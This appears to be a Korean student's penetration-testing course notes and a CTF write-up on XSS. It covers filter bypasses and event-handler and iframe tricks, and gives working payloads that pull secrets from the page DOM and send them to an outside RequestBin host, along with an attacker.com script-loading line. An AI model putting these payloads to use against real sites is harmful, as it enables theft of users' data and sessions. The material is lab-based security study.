--- meta
title: Penetration Testing | Week 11
date: 2025/06/25
excerpt: XSS 취약점 응용
categories: 모의 해킹
---

### 강의 노트

#### XSS 대응 방안 및 우회 기법

XSS에 대한 기본적인 대응 방법은 **HTML 인코딩**, 즉 HTML Entity를 사용하는 것이다. 이외에도 다양한 대응 방안들을 고려해 볼 수 있겠지만, 대부분의 경우 제한 사항이 존재하거나 우회될 가능성이 있다.

<br>

##### 입력 길이 제한

먼저 입력 길이 제한에 대해 생각해 보자. 예를 들어 사용자가 입력할 수 있는 텍스트 길이가 100자로 제한된 경우, 공격자는 직접적인 쿠키 탈취 코드를 삽입하기 어렵다. 하지만 다음과 같은 방법을 통해 이를 우회할 수 있다.

```html
<script src="http://attacker.com/exploit.js"></script>
```

`<script>` 태그의 `src` 속성은 외부 javascript 파일을 불러올 때 사용한다. 즉, 사전에 스크립트를 작성해 두고 이를 가져와 실행하는 방식을 활용함으로써 길이 제한을 우회할 수 있다. 따라서 입력 길이 제한은 XSS 대응에 있어서 실효성 있는 방어 수단으로 보기 어렵다.

<br>

##### 필터링

다음으로, 필터링 방식에 대해 생각해 볼 수 있다. 필터링은 일반적으로 **White List** 필터링과 **Black List** 필터링으로 분류된다.

우선 White List 필터링은 허용된 항목 외의 모든 요소를 차단하므로, 공격 페이로드의 대부분을 사전에 제거할 수 있고 보안 차원에서 매우 효과적이다. 하지만 이러한 방식은 적용 가능한 환경이 제한적이라는 치명적인 한계가 있다. 예를 들어 게시판과 같이 사용자가 자유롭게 텍스트를 입력할 수 있어야 하는 환경에서는 사용자 경험을 심각하게 제한할 수 있다. 그럼에도 불구하고, 환경적 제약이 허용되는 경우 White List 필터링 방식은 매우 신뢰할 수 있는 방어책이 될 수 있다.

반면 Black List 필터링은 상대적으로 사용자에게 더 많은 자유를 제공한다. 그러나 허용되는 범위가 넓은 만큼, 필터 우회를 시도할 수 있는 여지가 많아 보안적인 측면에서 취약할 수 있다. 실제로 Black List 필터링은 원칙적으로 우회가 가능하다고 전제하는 것이 보다 현실적인 접근 방식이다.

Black List 필터링의 다양한 우회 기법들을 살펴 보자. 예를 들어 `script` 문자열이 필터링되는 경우, 이를 우회하기 위해 대소문자를 혼용하여 `ScRiPt`와 같은 방식으로 입력할 수 있다. 이는 HTML 태그명이 대소문자를 구분하지 않기 때문이다. 혹은 `script` 문자열이 빈 문자열로 치환되는 구조라면, 공격자가 `scrscriptipt`와 같은 문자열을 대신 사용하여 여전히 정상적인 `<script>` 태그를 구성할 수 있다.

<br>

##### 이벤트 핸들러

설계 단계에서 어떠한 방식으로든 `<script>` 태그의 사용을 철저히 차단하도록 구현하였다 하더라도, 이를 우회할 수 있는 기법이 존재한다. 그 대표적인 방법이 바로 <strong>이벤트 핸들러(Event Handler)</strong>를 활용하는 방식이다. 다음의 예시를 보자.

```html
<img src="x" onerror="alert(1);">
```

이벤트 핸들러란 특정 이벤트가 발생했을 때 실행되는 함수 또는 코드를 의미한다. 위 예제 코드는 `<img>` 태그 내에 `onerror`라는 이벤트 속성을 사용해 이벤트 핸들러를 등록해 놓은 경우에 해당하는데, `onerror` 속성은 오류가 발생했을 때 내장된 javascript 코드를 실행하도록 한다. 이미지의 `src` 속성에 존재하지 않는 경로(x)를 지정함으로써 정상적인 이미지 로딩에 실패하게 되고, 이로 인해 `onerror` 속성 내에 명시된 javascipt가 실행되는 구조이다.

`onerror` 외에도 다양한 이벤트 속성이 존재하며, 여러 방식으로 XSS 공격에 활용될 수 있다. 아래는 대표적인 예시 중 일부이다.

<pre><code class="language-html hljs language-xml" data-highlighted="yes"><span class="hljs-comment">// 웹 페이지 로드 후 스크립트 실행</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"alert(1);"</span>&gt;</span>

<span class="hljs-comment">// 요소가 포커스될 경우 스크립트 실행(autofocus 속성으로 인해 자동으로 포커스됨)</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">"alert(1);"</span>&gt;</span>
</code></pre>

<br>

##### JavaScript URL

웹 브라우저의 주소 창에서 직접 javascript 코드를 실행할 수 있다는 점을 악용하는 방법도 존재한다. 예를 들어, 브라우저 주소 창에 `javascript:alert(1);`을 입력하면 `alert(1)`이 실행되어 다음과 같이 알림 창이 표시된다.

![JavaScript URL](/data/Penetration%20Testing%20%7C%20Week%2011/1.png)

이와 같은 특성을 활용하여 스크립트를 삽입하는 방법으로는 `<a>` 태그를 이용하는 방식이 있다. 다음의 예시 코드를 보자.

```html
<a href="javascript:alert(1);">LINK</a>
```

`<a>` 태그의 `href` 속성은 브라우저가 이동할 대상 경로를 지정한다. 만약 해당 속성에 `javascript:`로 시작하는 문자열이 포함될 경우, 브라우저는 이를 주소 창에 직접 입력한 것과 동일하게 인식하여 내포된 javascript 구문을 실행한다. 이러한 특성 역시 XSS 공격에 활용될 수 있으므로 주의가 필요하다.

<br>

##### HTML 편집기에서의 XSS 대응

간혹 게시판 혹은 블로그 서비스 등에서 사용자에게 직접 HTML 코드를 입력할 수 있는 HTML 편집기 기능을 제공하는 경우가 있다. HTML 편집기가 정상적으로 기능하기 위해서는, 일반적인 방식의 HTML 인코딩을 적용할 수 없다. 사용자가 실제 HTML 코드를 작성하도록 허용하는 구조이기 때문이다. 그렇다면 이러한 환경에서는 XSS 공격을 어떻게 방지할 수 있을까?

요약하면, 다음과 같은 3단계 절차를 통해 대응할 수 있다.

**1. 입력 파라미터에 포함된 모든 특수 문자를 일괄적으로 HTML Entity로 변환**  
**2. 사전에 허용된 태그(White List 기반)를 식별한 후, 해당 태그만 원상 복원**  
**3. 복원된 태그 내에 포함된 이벤트 핸들러를 검토하고, 악용 가능한 속성이 존재할 경우 Black List 기반으로 필터링**

위와 같은 절차를 적용함으로써, HTML 인코딩의 적용이 제한되는 환경에서도 일정 수준의 XSS 대응이 가능하다. 이는 사용자에게 HTML 편집 기능을 제공하면서도 보안성을 유지하기 위한 실질적인 방안이라 할 수 있다.

---

#### XSS에서의 JavaScript 활용

지금까지 XSS 취약점을 탐지하는 방법과 이에 대한 대응 및 우회 기법에 대해 고찰하였다. 그러나 이러한 XSS 취약점을 실제 공격에 활용하는 방식에 대해서는 주로 쿠키 탈취에 국한된 예시만을 다루었다. 이제 자바스크립트를 활용하여 구현할 수 있는 다양한 기능들을 학습함으로써 XSS 취약점을 통해 실질적으로 수행 가능한 공격 기법 전반에 대해 살펴 보자.

<br>

##### 페이지 리다이렉션

```js
// 사용자를 악성 웹 사이트로 이동시킴
location.href = "http://attacker.com";
location.replace("http://attacker.com");
```

`location` 객체의 `href` 속성 혹은 `replace()` 메서드를 활용하여 사용자를 원치 않는 외부 사이트로 강제로 리다이렉트시킬 수 있다. 이 중 `href` 속성을 사용할 경우 사용자의 브라우저의 히스토리에 해당 이동 기록이 저장되며, `replace()` 메서드를 사용하면 이동 내역이 저장되지 않아 사용자가 뒤로 가기를 시도하더라도 원래 페이지로 복귀할 수 없다는 특성이 있다.

<br>

##### URL 변조

```js
// 사용자 브라우저의 URL을 변조
history.pushState(null, null, "/secure");
history.replaceState(null, null, "/secure");
```

`history` 객체의 `pushState()` 또는 `replaceState()` 메서드를 활용하면 사용자가 현재 접속 중인 웹 페이지의 URL을 변경할 수 있다. 이를 통해 마치 안전한 주소인 것처럼 위장하는 것이 가능하다. `pushState()` 메서드는 브라우저의 히스토리에 새로운 기록을 추가하고, `replaceState()` 메서드는 기존의 현재 기록을 대체하여 히스토리에 추가적인 항목을 생성하지 않는다는 점에서 차이가 있다.

<br>

##### DOM 객체 접근

```js
// 모든 <p> 태그 요소 가져오기
document.getElementsByTagName('p');

// 클래스명이 'menu'인 모든 요소 가져오기
document.getElementsByClassName('menu-item');

// 클래스명이 'menu'인 첫 번째 요소 가져오기
document.getElementsByClassName('menu-item')[0];

// 아이디가 'name'인 요소 가져오기
document.getElementById('name');

// 아이디가 'name'인 요소의 클래스명 가져오기
document.getElementById('name').className;

// 아이디가 'name'인 요소의 내부 HTML 코드 가져오기
document.getElementById('name').innerHTML;
```

`document` 객체의 메서드들을 활용하면 DOM 객체에 접근할 수 있고, 사용자가 현재 열람 중인 웹 페이지에 존재하는 정보를 취득할 수 있다. 이를 통해 공격자는 페이지 내 민감한 데이터를 탈취하거나 조작할 수 있다.

<br>

##### Inline Frame

만약 취약점이 존재하는 위치와 공격자가 탈취하려는 민감한 정보가 존재하는 위치가 서로 다른 페이지라고 가정해 보자. 이때 정보를 탈취하기 위해 단순한 리다이렉션 방식은 사용할 수 없다. 이는 스크립트가 페이지 로딩 이후 재실행되지 않기 때문에, 리다이렉트된 페이지에서는 XSS 페이로드가 더 이상 활성화되지 않기 때문이다.

이러한 상황에서는 현재 취약한 페이지 내에서 목표 페이지를 불러온 후 해당 페이지에 접근하는 방식이 효과적일 수 있다. 이를 가능하게 하는 도구가 바로 `<iframe>` 태그이다.

```html
<iframe src="http://example.com/target.php"></iframe>
```

`<iframe>` 태그를 사용하면 `src` 속성에 명시된 외부 페이지를 현재 페이지 내의 별도 프레임 영역에 삽입하여 표시할 수 있다. 이러한 구조를 Inline Frame이라고 하며, 이때 프레임에 로드된 페이지 역시 `document` 객체를 통해 DOM에 접근할 수 있다. 다음의 예시 코드를 보자.

```js
// 첫 번째 <iframe> 태그 요소 가져오기
var target = document.getElementsByTagName("iframe")[0];

// 프레임 내 페이지의 DOM 접근하기
var targetDoc = target.contentDocument;

// 해당 페이지에서 모든 <p> 태그 요소 가져오기
targetDoc.getElementsByTagName('p');
```

`contentDocument` 속성을 사용하면 `<iframe>` 태그 내에 로드된 하위 문서의 DOM 객체에 접근할 수 있다. 이를 통해 공격자는 다른 페이지에 존재하는 정보 역시 탈취·조작할 수 있게 된다.

<br>
<br>
<br>

### 과제

#### ClientScript CTF

![ClientScript CTF](/data/Penetration%20Testing%20%7C%20Week%2011/2.png)

CTF를 해결하며 XSS 취약점을 활용한 다양한 공격 기법들을 실습해 보자.

<br>

##### Basic Script Prac

<img src="/data/Penetration%20Testing%20%7C%20Week%2011/3.png" alt="Basic Script Prac" style="padding: 0 200px; background-color: white;">

링크의 주소로 접속하면 회원제 게시판 애플리케이션으로 이동한다.

회원 가입 및 로그인을 진행한 후, 마이페이지에서 플래그의 위치를 파악할 수 있었다.

![Basic Script Prac](/data/Penetration%20Testing%20%7C%20Week%2011/4.png)

Burp Suite를 활용하여 해당 위치가 정확히 어떤 요소인지 확인해 보았다.

![Basic Script Prac](/data/Penetration%20Testing%20%7C%20Week%2011/5.png)

그 결과 두 번째 `<input>` 태그의 `placeholder`에 플래그가 존재함을 알 수 있었다.

다음으로 관리자 정보 추출을 위해 XSS 취약점을 탐색해 보았다. 마이페이지에 취약점이 존재한다고 하였으므로, `user` 파라미터에 전달된 값이 그대로 첫 번째 입력 란에 표시되고 있을 가능성이 높다고 판단하였다. 따라서 `user` 파라미터의 값을 `<'">`로 수정한 뒤 요청을 전송해 보았다.

![Basic Script Prac](/data/Penetration%20Testing%20%7C%20Week%2011/6.png)

특수 문자가 별도의 변환 처리 없이 그대로 서버 응답에 반환되는 것을 확인하였다. 이어서 `<script>` 태그가 사용 가능한지 확인해 보았다.

![Basic Script Prac](/data/Penetration%20Testing%20%7C%20Week%2011/7.png)

`<script>` 태그 역시 별도의 필터링 없이 서버 응답에 정상적으로 포함되었다. 따라서 XSS 공격이 가능하다고 판단하고 삽입할 페이로드를 다음과 같이 작성하였다.

<pre><code class="language-html hljs language-xml" data-highlighted="yes"><span class="hljs-string">"</span>/&gt;
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
  <span class="hljs-comment">// 두 번째 input 태그의 placeholder 접근</span>
  <span class="hljs-keyword">var</span> flag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">'input'</span>)[<span class="hljs-number">1</span>].<span class="hljs-property">placeholder</span>;
  
  <span class="hljs-comment">// flag를 RequestBin 엔드포인트로 전송</span>
  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://vxvufng.request.dreamhack.games/?flag="</span> + flag;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
&lt;
</code></pre>

이후 `user` 파라미터에 해당 페이로드를 삽입하여 요청을 전송해 보았다.

![Basic Script Prac](/data/Penetration%20Testing%20%7C%20Week%2011/8.png)

악성 스크립트가 서버 응답에 정상적으로 포함되었으나, RequestBin에서는 요청이 수신되지 않았다. 이에 대해 잠시 고민한 결과, 브라우저의 개발자 도구를 통해 원인을 파악할 수 있었다.

![Basic Script Prac](/data/Penetration%20Testing%20%7C%20Week%2011/9.png)

콘솔에 `Uncaught TypeError: Cannot read properties of undefined`라는 오류 메시지가 출력되고 있었다. 즉, 정의되지 않은 요소의 속성 값을 가져오려고 시도했다는 의미이다. 해당 오류의 원인은 비교적 신속하게 파악할 수 있었는데, 바로 `<script>` 태그가 두 번째 `<input>` 태그보다 상위에 위치하고 있었기 때문이었다. HTML 문서는 순차적으로 실행되기 때문에 `<script>` 태그 내의 코드가 실행되는 시점에서는 플래그가 위치한 요소가 아직 DOM에 생성되지 않았던 것이다.

이를 해결할 수 있는 방안 중 하나로 **DOMContetLoaded** 이벤트를 사용하는 방법이 있다.

> **DOMContentLoaded**
>
> **DOMContentLoaded**는 HTML 문서의 모든 DOM 요소가 로드되었을 때 발생하는 이벤트이다. 즉, 브라우저가 HTML 코드를 모두 읽고 DOM 트리를 완성한 시점에 이 이벤트가 발생한다. 따라서 JavaScript 코드를 해당 이벤트에 등록하여 실행할 경우, DOM 요소가 존재하지 않아 발생할 수 있는 오류를 사전에 방지할 수 있다.
>
> 아래는 DOMContentLoaded 이벤트를 사용하는 예시이다.
>
> ```html
> ...
> <script>
>   document.addEventListener('DOMContentLoaded', function () {
>     console.log(document.getElementById('submit-btn'));
>   });
> </script>
> <button id="submit-btn">Submit</button>
> ...
> ```

다른 해결 방안으로는 `<img>` 태그의 `onerror` 속성을 통한 이벤트 핸들러를 활용하는 방법이 있다. 이미지를 로딩하는 데에는 일정 시간이 소요되므로 그 사이에 DOM 요소가 정상적으로 로드될 수 있는 여유가 발생하고, 이에 따라 하위에 위치한 요소에 접근할 수 있기 때문이다. 해당 방법이 스크립트가 간결할 것으로 생각되어 이를 채택하였으며, 페이로드를 다음과 같이 수정하였다.

<pre><code class="language-html hljs language-xml" data-highlighted="yes"><span class="hljs-string">"</span>/&gt;
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"x"</span>
     <span class="hljs-attr">onerror</span>=<span class="hljs-string">"</span>
       <span class="hljs-keyword">var</span> flag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">'input'</span>)[<span class="hljs-number">1</span>].<span class="hljs-property">placeholder</span>;
       <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
       img.<span class="hljs-property">src</span> = <span class="hljs-string">'https://vxvufng.request.dreamhack.games/?flag='</span> + flag;
</span></code></pre>

![Basic Script Prac](/data/Penetration%20Testing%20%7C%20Week%2011/10.png)

<img src="/data/Penetration%20Testing%20%7C%20Week%2011/11.png" alt="Basic Script Prac" style="height: 200px; padding: 0 200px; background-color: white">

이벤트 핸들러에 악성 스크립트가 정상적으로 등록되며, RequestBin에서도 요청이 수신되는 것을 확인할 수 있다. 해당 요청의 URL을 복사하여 관리자 방문 Bot 페이지에 붙여 넣은 후 관리자가 해당 URL로 접근하도록 하였다.

![Basic Script Prac](/data/Penetration%20Testing%20%7C%20Week%2011/12.png)

이후 RequestBin에서 관리자 정보가 포함된 요청을 수신하여 플래그를 획득하였다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2011/13.png" alt="Basic Script Prac" style="height: 200px; padding: 0 150px; background-color: white">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">BasicScriptSOEaasy</span>}</span></p>

<br>

##### Steal Info

<img src="/data/Penetration%20Testing%20%7C%20Week%2011/14.png" alt="Steal Info" style="padding: 0 200px; background-color: white;">

먼저 중요 정보가 존재한다는 `mypage.html`과 `secret.php`로 각각 접속해 보았다.

![Steal Info](/data/Penetration%20Testing%20%7C%20Week%2011/15.png)
![Steal Info](/data/Penetration%20Testing%20%7C%20Week%2011/16.png)

`mypage.html`은 간단한 마이페이지의 형태였으며, 내 정보 탭에 `This is a Very Secret Info.`라는 텍스트가 출력되고 있었다. `secret.php`에서는 관리자가 아닌 일반 사용자 권한으로 접근하였기 때문에 권한이 없다는 메시지가 출력되었으나, 관리자가 해당 페이지에 접속한 경우 내 정보 탭에 플래그가 출력될 것으로 예측되었다.

다음으로 회원제 게시판으로 이동하여 XSS 취약점을 탐색하였다.

![Steal Info](/data/Penetration%20Testing%20%7C%20Week%2011/17.png)

게시판에 글을 작성하고 게시물 열람 페이지에서 서버 응답을 분석한 결과 글 내용에 포함된 특수 문자가 별도 변환 처리 없이 그대로 전달되는 것을 확인하였다. 또한 `<script>` 태그 역시 삽입이 가능함을 확인함에 따라 XSS 취약점이 존재하는 위치를 특정할 수 있었다.

취약점이 존재하는 페이지는 `notice_write.php`이고, 플래그가 존재하는 페이지는 `secret.php`이기 때문에 `<iframe>` 태그를 활용한 공격 전략을 구상하였다. 따라서 삽입 페이로드를 다음과 같이 작성하였다.

```html
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac/secret.php"></iframe>
<script>
  var targetDoc = document.getElementsByTagName('iframe')[0].contentDocument;

  // mypage.html에서 'This is a Very Secret Info.' 텍스트에 해당하는 DOM 요소 접근
  var flag = targetDoc.getElementsByClassName('card-text')[1].innerHTML;
  
  var img = new Image();
  img.src = "https://vxvufng.request.dreamhack.games/?flag=" + flag;
</script>
```

게시글 작성 페이지로 이동하여 위의 페이로드를 글 내용 입력 란에 작성하고 게시물을 생성하였다.

![Steal Info](/data/Penetration%20Testing%20%7C%20Week%2011/18.png)

게시물 열람 페이지의 URL을 확인한 후, 관리자 방문 Bot 페이지에서 관리자가 해당 URL로 접근하도록 하였다.

![Steal Info](/data/Penetration%20Testing%20%7C%20Week%2011/19.png)

이후 RequestBin에서 관리자 정보가 포함된 요청을 수신하여 플래그를 획득하였다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2011/20.png" alt="Steal Info" style="height: 200px; padding: 0 150px; background-color: white;">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">steaLInfo</span>}</span></p>

<br>

##### Steal Info 2

<img src="/data/Penetration%20Testing%20%7C%20Week%2011/21.png" alt="Steal Info 2" style="padding: 0 200px; background-color: white;">

링크의 주소로 접속하여 Steal Info와 동일한 위치에 XSS 취약점이 존재한다는 사실을 파악하였다. 플래그의 위치는 마이페이지이기 때문에 마찬가지로 `<iframe>`을 활용해 페이로드를 작성하였다.

```html
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php"></iframe>
<script>
  var targetDoc = document.getElementsByTagName('iframe')[0].contentDocument;

  // mypage.php에서 정보 란에 해당하는 DOM 요소 접근
  var flag = targetDoc.getElementById('userInfo').placeholder;
  
  var img = new Image();
  img.src = "https://vxvufng.request.dreamhack.games/?flag=" + flag;
</script>
```

글 내용에 위 페이로드를 삽입하여 게시물을 생성한 후 열람해 보았다.

![Steal Info 2](/data/Penetration%20Testing%20%7C%20Week%2011/22.png)

Steal Info와 달리 `Uncaught TypeError: Cannot read properties of undefined`라는 오류 메시지가 출력되었다. 해당 오류의 원인을 분석한 결과, `<iframe>` 내의 마이페이지 로딩에 시간이 상당히 소요되는 듯했다. 이를 해결하기 위해 `<iframe>` 요소에 `onload` 이벤트 핸들러를 등록하여 마이페이지가 로딩된 이후 스크립트가 실행되도록 처리하였다. 수정된 페이로드는 다음과 같다.

```html
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php"></iframe>
<script>
  var target = document.getElementsByTagName('iframe')[0];

  target.onload = function () {
    var targetDoc = target.contentDocument;

    // mypage.php에서 정보 란에 해당하는 DOM 요소 접근
    var flag = targetDoc.getElementById('userInfo').placeholder;
    
    var img = new Image();
    img.src = "https://vxvufng.request.dreamhack.games/?flag=" + flag;
  }
</script>
```

![Steal Info 2](/data/Penetration%20Testing%20%7C%20Week%2011/23.png)

수정된 페이로드를 사용해 게시물을 생성하자, 오류 없이 정상적으로 스크립트가 실행된 것을 확인하였다. 다음으로 게시물 열람 페이지의 URL을 확인한 후, 관리자 방문 Bot 페이지에서 관리자가 해당 URL로 접근하도록 하였다.

![Steal Info 2](/data/Penetration%20Testing%20%7C%20Week%2011/24.png)

이후 RequestBin에서 관리자 정보가 포함된 요청을 수신하여 플래그를 획득하였다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2011/25.png" alt="Steal Info 2" style="height: 200px; padding: 0 150px; background-color: white;">

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">GETITGETIT!</span>}</span></p>